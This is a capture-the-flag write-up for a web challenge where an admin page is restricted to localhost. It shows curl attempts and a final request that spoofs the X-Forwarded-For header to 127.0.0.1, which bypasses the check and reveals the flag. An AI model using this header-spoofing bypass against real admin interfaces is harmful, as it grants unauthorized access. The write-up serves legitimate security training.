# localhost_only (493)

Adminportalen /admin/ er kun tilgjengelig fra 127.0.0.1

https://helsectf2023-6ac4e1c6d8855c1bd96a-localhost_only.chals.io/

# Writeup

First I tried to use curl to resolve `127.0.0.1` as the servers IP address. So started by getting an IP.. 

```
$ host helsectf2023-6ac4e1c6d8855c1bd96a-localhost_only.chals.io
helsectf2023-6ac4e1c6d8855c1bd96a-localhost_only.chals.io has address 143.244.222.116
helsectf2023-6ac4e1c6d8855c1bd96a-localhost_only.chals.io has address 143.244.222.115
```

I've got a choice of two, lets try one by one.

```
curl --resolve 127.0.0.1:443:143.244.222.116 https://0177.0.0.1/admin/ --insecure -v
curl --resolve 127.0.0.1:443:143.244.222.115 https://127.0.0.1/admin/ --insecure -v
```

Empty response on both IP's. What am I doing wrong here. 

Trying different host headers, nothing works until I get to `X-Forwarded-For`.

```
$ curl https://helsectf2023-6ac4e1c6d8855c1bd96a-localhost_only.chals.io/admin/ --insecure -H 'X-Forwarded-For: 127.0.0.1'
helsectf{x-forwarded-4ever<3}   
```

# Flag

```
helsectf{x-forwarded-4ever<3}
```